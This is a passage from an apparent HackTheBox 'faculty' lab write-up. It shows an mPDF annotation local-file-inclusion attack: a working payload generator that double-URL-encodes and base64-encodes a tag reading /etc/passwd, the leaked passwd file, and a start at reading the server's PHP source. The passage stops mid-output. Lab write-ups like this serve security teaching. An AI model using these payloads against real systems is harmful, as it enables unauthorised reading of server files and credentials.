<div class="highlight-html notranslate"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;top&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>faculty.htb<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>Subjects<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">table</span><span class="p">&gt;</span>    
	<span class="p">&lt;</span><span class="nt">thead</span><span class="p">&gt;</span>        
		<span class="p">&lt;</span><span class="nt">tr</span><span class="p">&gt;</span> 
			<span class="p">&lt;</span><span class="nt">th</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;text-center&quot;</span><span class="p">&gt;</span>#<span class="p">&lt;/</span><span class="nt">th</span><span class="p">&gt;</span> 
			<span class="p">&lt;</span><span class="nt">th</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;text-left&quot;</span><span class="p">&gt;</span>Subject<span class="p">&lt;/</span><span class="nt">th</span><span class="p">&gt;</span> 
			<span class="p">&lt;</span><span class="nt">th</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;text-left&quot;</span><span class="p">&gt;</span>Description<span class="p">&lt;/</span><span class="nt">th</span><span class="p">&gt;</span> 
		<span class="p">&lt;/</span><span class="nt">tr</span><span class="p">&gt;</span>
	<span class="p">&lt;/</span><span class="nt">thead</span><span class="p">&gt;</span>
	<span class="p">&lt;</span><span class="nt">tbody</span><span class="p">&gt;</span>
		<span class="p">&lt;</span><span class="nt">tr</span><span class="p">&gt;</span>
			<span class="p">&lt;</span><span class="nt">td</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;text-center&quot;</span><span class="p">&gt;</span>1<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
			<span class="p">&lt;</span><span class="nt">td</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;text-center&quot;</span><span class="p">&gt;&lt;</span><span class="nt">b</span><span class="p">&gt;</span>DBMS<span class="p">&lt;/</span><span class="nt">b</span><span class="p">&gt;&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
			<span class="p">&lt;</span><span class="nt">td</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;text-center&quot;</span><span class="p">&gt;&lt;</span><span class="nt">small</span><span class="p">&gt;&lt;</span><span class="nt">b</span><span class="p">&gt;</span>Database Management System<span class="p">&lt;/</span><span class="nt">b</span><span class="p">&gt;&lt;/</span><span class="nt">small</span><span class="p">&gt;&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
		<span class="p">&lt;/</span><span class="nt">tr</span><span class="p">&gt;</span>
		<span class="p">&lt;</span><span class="nt">tr</span><span class="p">&gt;</span>
			<span class="p">&lt;</span><span class="nt">td</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;text-center&quot;</span><span class="p">&gt;</span>2<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
			<span class="p">&lt;</span><span class="nt">td</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;text-center&quot;</span><span class="p">&gt;&lt;</span><span class="nt">b</span><span class="p">&gt;</span>Mathematics<span class="p">&lt;/</span><span class="nt">b</span><span class="p">&gt;&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
			<span class="p">&lt;</span><span class="nt">td</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;text-center&quot;</span><span class="p">&gt;&lt;</span><span class="nt">small</span><span class="p">&gt;&lt;</span><span class="nt">b</span><span class="p">&gt;</span>Mathematics<span class="p">&lt;/</span><span class="nt">b</span><span class="p">&gt;&lt;/</span><span class="nt">small</span><span class="p">&gt;&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
		<span class="p">&lt;/</span><span class="nt">tr</span><span class="p">&gt;</span>
		<span class="p">&lt;</span><span class="nt">tr</span><span class="p">&gt;</span>
			<span class="p">&lt;</span><span class="nt">td</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;text-center&quot;</span><span class="p">&gt;</span>3<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
			<span class="p">&lt;</span><span class="nt">td</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;text-center&quot;</span><span class="p">&gt;&lt;</span><span class="nt">b</span><span class="p">&gt;</span>English<span class="p">&lt;/</span><span class="nt">b</span><span class="p">&gt;&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
			<span class="p">&lt;</span><span class="nt">td</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;text-center&quot;</span><span class="p">&gt;&lt;</span><span class="nt">small</span><span class="p">&gt;&lt;</span><span class="nt">b</span><span class="p">&gt;</span>English<span class="p">&lt;/</span><span class="nt">b</span><span class="p">&gt;&lt;/</span><span class="nt">small</span><span class="p">&gt;&lt;/</span><span class="nt">td</span><span class="p">&gt;&lt;/</span><span class="nt">tr</span><span class="p">&gt;</span>
		<span class="p">&lt;</span><span class="nt">tr</span><span class="p">&gt;</span>
			<span class="p">&lt;</span><span class="nt">td</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;text-center&quot;</span><span class="p">&gt;</span>4<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
			<span class="p">&lt;</span><span class="nt">td</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;text-center&quot;</span><span class="p">&gt;&lt;</span><span class="nt">b</span><span class="p">&gt;</span>Computer Hardware<span class="p">&lt;/</span><span class="nt">b</span><span class="p">&gt;&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
			<span class="p">&lt;</span><span class="nt">td</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;text-center&quot;</span><span class="p">&gt;&lt;</span><span class="nt">small</span><span class="p">&gt;&lt;</span><span class="nt">b</span><span class="p">&gt;</span>Computer Hardware<span class="p">&lt;/</span><span class="nt">b</span><span class="p">&gt;&lt;/</span><span class="nt">small</span><span class="p">&gt;&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
		<span class="p">&lt;/</span><span class="nt">tr</span><span class="p">&gt;</span>
		<span class="p">&lt;</span><span class="nt">tr</span><span class="p">&gt;</span>
			<span class="p">&lt;</span><span class="nt">td</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;text-center&quot;</span><span class="p">&gt;</span>5<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
			<span class="p">&lt;</span><span class="nt">td</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;text-center&quot;</span><span class="p">&gt;&lt;</span><span class="nt">b</span><span class="p">&gt;</span>History<span class="p">&lt;/</span><span class="nt">b</span><span class="p">&gt;&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
			<span class="p">&lt;</span><span class="nt">td</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;text-center&quot;</span><span class="p">&gt;&lt;</span><span class="nt">small</span><span class="p">&gt;&lt;</span><span class="nt">b</span><span class="p">&gt;</span>History<span class="p">&lt;/</span><span class="nt">b</span><span class="p">&gt;&lt;/</span><span class="nt">small</span><span class="p">&gt;&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
		<span class="p">&lt;/</span><span class="nt">tr</span><span class="p">&gt;</span>
	<span class="p">&lt;/</span><span class="nt">tboby</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">table</span><span class="p">&gt;</span>
</pre></div>
</div>
<p>But do we care? Probably not, lets try to swap that with what we want:</p>
<div class="highlight-html notranslate"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">annotation</span> <span class="na">file</span><span class="o">=</span><span class="s">&quot;/etc/passwd&quot;</span> <span class="na">content</span><span class="o">=</span><span class="s">&quot;/etc/passwd&quot;</span>  <span class="na">icon</span><span class="o">=</span><span class="s">&quot;Graph&quot;</span> <span class="na">title</span><span class="o">=</span><span class="s">&quot;Attached File: /etc/passwd&quot;</span> <span class="na">pos-x</span><span class="o">=</span><span class="s">&quot;195&quot;</span> <span class="p">/&gt;</span>
</pre></div>
</div>
<p><img alt="cyber-chef-encode.png" src="../../../../_images/cyber-chef-encode.png" /></p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">JTI1M0Nhbm5vdGF0aW9uJTI1MjBmaWxlPSUyNTIyL2V0Yy9wYXNzd2QlMjUyMiUyNTIwY29udGVudD0lMjUyMi9ldGMvcGFzc3dkJTI1MjIlMjUyMCUyNTIwaWNvbj0lMjUyMkdyYXBoJTI1MjIlMjUyMHRpdGxlPSUyNTIyQXR0YWNoZWQlMjUyMEZpbGU6JTI1MjAvZXRjL3Bhc3N3ZCUyNTIyJTI1MjBwb3MteD0lMjUyMjE5NSUyNTIyJTI1MjAvJTI1M0U</span><span class="o">=</span>
</pre></div>
</div>
<p>and as expected we have an annotation file showing up as this graph icon<br />
<img alt="graph.png" src="../../../../_images/graph.png" /></p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">root</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
<span class="n">daemon</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="n">daemon</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="nb">bin</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">2</span><span class="p">:</span><span class="mi">2</span><span class="p">:</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">sys</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">3</span><span class="p">:</span><span class="mi">3</span><span class="p">:</span><span class="n">sys</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">sync</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">4</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="n">sync</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sync</span>
<span class="n">games</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">5</span><span class="p">:</span><span class="mi">60</span><span class="p">:</span><span class="n">games</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">games</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">man</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">6</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">man</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">cache</span><span class="o">/</span><span class="n">man</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">lp</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">7</span><span class="p">:</span><span class="mi">7</span><span class="p">:</span><span class="n">lp</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">lpd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">mail</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">8</span><span class="p">:</span><span class="mi">8</span><span class="p">:</span><span class="n">mail</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">mail</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">news</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">9</span><span class="p">:</span><span class="mi">9</span><span class="p">:</span><span class="n">news</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">news</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">uucp</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="n">uucp</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">uucp</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">proxy</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="n">proxy</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">backup</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="n">backup</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">backups</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="nb">list</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="n">Mailing</span> <span class="n">List</span> <span class="n">Manager</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="nb">list</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">irc</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="n">ircd</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">ircd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">gnats</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="n">Gnats</span> <span class="n">Bug</span><span class="o">-</span><span class="n">Reporting</span> <span class="n">System</span> <span class="p">(</span><span class="n">admin</span><span class="p">):</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">gnats</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">nobody</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="n">nobody</span><span class="p">:</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">systemd</span><span class="o">-</span><span class="n">network</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">100</span><span class="p">:</span><span class="mi">102</span><span class="p">:</span><span class="n">systemd</span> <span class="n">Network</span> <span class="n">Management</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">systemd</span><span class="o">-</span><span class="n">resolve</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">102</span><span class="p">:</span><span class="mi">103</span><span class="p">:</span><span class="n">systemd</span> <span class="n">Resolver</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">systemd</span><span class="o">-</span><span class="n">timesync</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">102</span><span class="p">:</span><span class="mi">104</span><span class="p">:</span><span class="n">systemd</span> <span class="n">Time</span> <span class="n">Synchronization</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">messagebus</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">103</span><span class="p">:</span><span class="mi">106</span><span class="p">::</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">syslog</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">104</span><span class="p">:</span><span class="mi">110</span><span class="p">::</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">syslog</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">_apt</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">105</span><span class="p">:</span><span class="mi">65534</span><span class="p">::</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">tss</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">106</span><span class="p">:</span><span class="mi">111</span><span class="p">:</span><span class="n">TPM</span> <span class="n">software</span> <span class="n">stack</span><span class="p">,,,:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">tpm</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">false</span>
<span class="n">uuidd</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">107</span><span class="p">:</span><span class="mi">112</span><span class="p">::</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">uuidd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">tcpdump</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">108</span><span class="p">:</span><span class="mi">113</span><span class="p">::</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">landscape</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">109</span><span class="p">:</span><span class="mi">115</span><span class="p">::</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">landscape</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">pollinate</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">110</span><span class="p">:</span><span class="mi">1</span><span class="p">::</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">cache</span><span class="o">/</span><span class="n">pollinate</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">false</span>
<span class="n">sshd</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">111</span><span class="p">:</span><span class="mi">65534</span><span class="p">::</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">sshd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">systemd</span><span class="o">-</span><span class="n">coredump</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">999</span><span class="p">:</span><span class="mi">999</span><span class="p">:</span><span class="n">systemd</span> <span class="n">Core</span> <span class="n">Dumper</span><span class="p">:</span><span class="o">/</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">lxd</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">998</span><span class="p">:</span><span class="mi">100</span><span class="p">::</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">snap</span><span class="o">/</span><span class="n">lxd</span><span class="o">/</span><span class="n">common</span><span class="o">/</span><span class="n">lxd</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">false</span>
<span class="n">mysql</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">112</span><span class="p">:</span><span class="mi">117</span><span class="p">:</span><span class="n">MySQL</span> <span class="n">Server</span><span class="p">,,,:</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">false</span>
<span class="n">gbyolo</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1000</span><span class="p">:</span><span class="mi">1000</span><span class="p">:</span><span class="n">gbyolo</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">gbyolo</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
<span class="n">postfix</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">113</span><span class="p">:</span><span class="mi">119</span><span class="p">::</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">postfix</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">developer</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1001</span><span class="p">:</span><span class="mi">1002</span><span class="p">:,,,:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">developer</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
<span class="n">usbmux</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">114</span><span class="p">:</span><span class="mi">46</span><span class="p">:</span><span class="n">usbmux</span> <span class="n">daemon</span><span class="p">,,,:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">usbmux</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>grep<span class="w"> </span>sh$<span class="w"> </span>passwd
root:x:1:0:root:/root:/bin/bash
gbyolo:x:1000:1000:gbyolo:/home/gbyolo:/bin/bash
developer:x:1001:1002:,,,:/home/developer:/bin/bash
</pre></div>
</div>
<p>So is the very first thing we tried actually, that script would’ve worked if the backend did one urldecode and one base64 decode, but as we saw before the owner of the box makes it do a second urlencode /decode to throw us off, (and it worked).<br />
So this simple change on the script would’ve generated a working payload:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>diff<span class="w"> </span>old-lfi.py<span class="w"> </span>lfi.py
33c33
&lt;<span class="w">     </span><span class="nv">encoded_payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>quote<span class="o">(</span>payload<span class="o">)</span>
---
&gt;<span class="w">     </span><span class="nv">encoded_payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>quote<span class="o">(</span>quote<span class="o">(</span>payload<span class="o">))</span>
</pre></div>
</div>
<p>Let’s use a slightly modified version of that now:</p>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">urllib.parse</span><span class="w"> </span><span class="kn">import</span> <span class="n">quote</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">cmd</span><span class="w"> </span><span class="kn">import</span> <span class="n">Cmd</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">base64</span><span class="w"> </span><span class="kn">import</span> <span class="n">b64encode</span>


<span class="k">def</span><span class="w"> </span><span class="nf">banner</span><span class="p">():</span>
    <span class="n">banner</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;                          _____  _____  ______   ______ ___  __   __                  _       _ _</span>
<span class="s2">                         |  __ \|  __ \|  ____| |____  / _ \ \ \ / /                 | |     (_) |</span>
<span class="s2">               _ __ ___  | |__) | |  | | |__        / / | | | \ V /    _____  ___ __ | | ___  _| |_</span>
<span class="s2">               | &#39;_ ` _ \|  ___/| |  | |  __|      / /| | | |  &gt; &lt;    / _ \ \/ / &#39;_ \| |/ _ \| | __|</span>
<span class="s2">               | | | | | | |    | |__| | |        / / | |_| | / . \  |  __/&gt;  &lt;| |_) | | (_) | | |_</span>
<span class="s2">             |_| |_| |_|_|    |_____/|_|       /_/ (_)___(_)_/ \_\  \___/_/\_\ .__/|_|\___/|_|\__|</span>
<span class="s2">                                                                               | |</span>
<span class="s2">                                                                               |_|   &quot;&quot;&quot;</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">banner</span><span class="p">)</span>

<span class="k">def</span><span class="w"> </span><span class="nf">payload_gen</span><span class="p">(</span><span class="n">fname</span><span class="p">):</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;&lt;annotation file=&quot;</span><span class="si">{</span><span class="n">fname</span><span class="si">}</span><span class="s1">&quot; content=&quot;</span><span class="si">{</span><span class="n">fname</span><span class="si">}</span><span class="s1">&quot; icon=&quot;Graph&quot; title=&quot;Attached File: </span><span class="si">{</span><span class="n">fname</span><span class="si">}</span><span class="s1">&quot; pos-x=&quot;195&quot; /&gt;&#39;</span>
    <span class="n">encoded_payload</span> <span class="o">=</span> <span class="n">quote</span><span class="p">(</span><span class="n">quote</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] Replace the content with the payload below&quot;</span><span class="p">)</span>

    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Double url encoded payload:</span><span class="se">\n</span><span class="si">{</span><span class="n">encoded_payload</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="n">base64enc</span> <span class="o">=</span> <span class="n">b64encode</span><span class="p">(</span><span class="n">encoded_payload</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Base64 encoded payload:</span><span class="se">\n</span><span class="si">{</span><span class="n">base64enc</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="p">(</span><span class="s2">&quot;__main__&quot;</span><span class="p">):</span>
    <span class="n">banner</span><span class="p">()</span>
    <span class="n">payload_gen</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
</pre></div>
</div>
<p>Sending invalid queries in burp earlier an error leaked a source file path to us:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">curl</span> <span class="s2">&quot;http://faculty.htb/admin/ajax.php?action=save_course&quot;</span>
</pre></div>
</div>
<p>So we can start by leaking that with the mPDF annotation LFI</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>python3<span class="w"> </span>lfi.py<span class="w"> </span>/var/www/scheduling/admin/admin_class.php
<span class="w">                          </span>_____<span class="w">  </span>_____<span class="w">  </span>______<span class="w">   </span>______<span class="w"> </span>___<span class="w">  </span>__<span class="w">   </span>__<span class="w">                  </span>_<span class="w">       </span>_<span class="w"> </span>_
